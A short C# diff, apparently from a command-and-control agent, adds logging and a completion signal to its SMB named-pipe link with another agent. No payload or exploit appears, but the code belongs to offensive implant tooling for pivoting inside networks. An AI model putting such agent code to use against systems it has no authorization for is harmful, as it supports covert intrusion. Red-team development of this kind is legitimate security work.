@@ -40,7 +40,11 @@ namespace Agent
                 {
                     this.clientPipe = new PipeClient<SmbMessage>(args.pipename, args.hostname);
                     this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
-                    this.clientPipe.Connected += (o, args) => this.connected = true;
+                    this.clientPipe.Connected += (o, args) =>
+                    {
+                        logger.Log("Connected to pipe.");
+                        this.connected = true;                        
+                    };
                     this.clientPipe.Disconnected += (o, args) => this.connected = false;
                     await clientPipe.ConnectAsync();
                     if (clientPipe.IsConnected)
@@ -48,8 +52,9 @@ namespace Agent
                         this.connected = true;
 
                         //Wait for the agent to give us its UUID
+                        logger.Log("Waiting for success.");
                         messageSuccess.WaitOne();
-
+                        logger.Log("done waiting for success.");
                         return new EdgeResponseResult()
                         {
                             task_id = task_id,
@@ -142,10 +147,10 @@ namespace Agent
 
                                 await this.messageManager.AddResponse(dm);
                                 this.partialMessages.TryRemove(args.Message.guid, out _);
+                                this.messageSuccess.Set();
                             }
                             break;
                         }
-
                 }
             }
             catch (Exception e)
